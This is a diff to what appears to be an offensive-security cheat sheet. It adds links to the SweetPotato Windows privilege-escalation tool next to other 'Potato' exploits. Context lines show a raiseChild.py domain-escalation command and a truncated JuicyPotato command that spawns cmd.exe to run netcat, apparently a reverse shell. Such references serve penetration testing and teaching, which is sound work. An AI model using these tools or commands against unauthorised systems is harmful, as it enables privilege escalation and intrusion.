@@ -2592,6 +2592,7 @@ $ raiseChild.py -target-exec <IP address> <domain>/<username>
 https://github.com/ohpe/juicy-potato
 https://github.com/itm4n/PrintSpoofer
 https://github.com/antonioCoco/RoguePotato
+https://github.com/CCob/SweetPotato
 https://github.com/BeichenDream/GodPotato
 ```
 
@@ -4636,6 +4637,12 @@ C:\> JuicyPotato.exe -l <port> -p c:\windows\system32\cmd.exe -a "/c c:\tools\nc
 
 ```
 https://github.com/antonioCoco/RoguePotato
+```
+
+- Sweet Potato
+
+```
+https://github.com/CCob/SweetPotato
 ```
 
 - GodPotato
